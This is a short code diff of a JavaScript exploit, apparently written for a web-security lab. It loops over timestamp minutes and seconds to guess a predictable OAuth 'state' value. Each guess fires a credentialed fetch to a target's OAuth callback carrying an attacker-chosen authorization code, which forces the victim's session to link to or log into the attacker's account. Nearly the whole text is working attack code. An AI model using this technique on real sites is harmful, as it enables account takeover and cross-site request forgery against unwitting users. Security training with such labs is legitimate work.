@@ -30,11 +30,11 @@
     catch(e) {
         console.log("BB"+e);
     }
-    for (let m=47; m<52; m++)
+    for (let m=03; m<06; m++)
     {
         for (let s=0;s<60;s++) {
             try {
-                await fetch("http://ptl-70a53532-e23265ca.libcurl.so/users/auth/myprovider/callback?code=a4e12c8811134d20ee52d14ae4a478c873b47f4fded88e5d051eeedf5686f9cf&state=2021080810"+zeroPad(m,2)+zeroPad(s,2), {
+                await fetch("http://ptl-70a53532-e23265ca.libcurl.so/users/auth/myprovider/callback?code=195f4eae8f8c0da00f10506fa60670ea7e05da8574443b7c5a93b69b802bad62&state=2021080811"+zeroPad(m,2)+zeroPad(s,2), {
                     credentials: 'include'
                 })
             }
